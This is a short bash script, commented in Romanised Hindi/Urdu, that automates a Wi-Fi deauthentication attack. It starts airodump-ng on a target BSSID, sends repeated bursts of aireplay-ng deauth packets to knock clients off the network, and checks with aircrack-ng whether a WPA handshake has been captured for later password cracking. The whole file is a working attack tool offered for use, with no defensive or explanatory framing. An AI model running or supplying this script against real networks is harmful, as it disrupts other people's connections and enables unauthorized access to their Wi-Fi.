#!/bin/bash
# Ye script 30 packets bhejega aur har 10 second baad check karega

INTERFACE=$1
BSSID=$2
CHANNEL=$3
CAP_FILE="/tmp/awb_attack"

# 1. Pehle Safai (Cleanup)
pkill airodump-ng
pkill aireplay-ng
sleep 2
rm -f ${CAP_FILE}-01.*

# 2. airodump-ng ko background mein chalu karo
airodump-ng -c $CHANNEL --bssid $BSSID -w $CAP_FILE --ignore-negative-one $INTERFACE > /dev/null 2>&1 &
AIRODUMP_PID=$!
sleep 4 # Channel set hone do

# 3. Loop: 6 Baar (Har baar 30 packets bhejega aur 10 second check karega)
for i in 1 2 3 4 5 6; do
    # 30 Deauth packets bhejo
    aireplay-ng -0 30 -a $BSSID --ignore-negative-one $INTERFACE > /dev/null 2>&1
    
    # 10 seconds wait karo taake phone connect ho aur handshake pakad jaye
    sleep 10
    
    # Check karo ke handshake mila ya nahi
    RESULT=$(aircrack-ng ${CAP_FILE}-01.cap 2>/dev/null)
    if echo "$RESULT" | grep -q "1 handshake"; then
        # Handshake mil gaya!
        kill $AIRODUMP_PID
        echo "SUCCESS"
        exit 0
    fi
done

# Agar 1 minute mein handshake nahi mila
kill $AIRODUMP_PID
echo "NO_HANDSHAKE"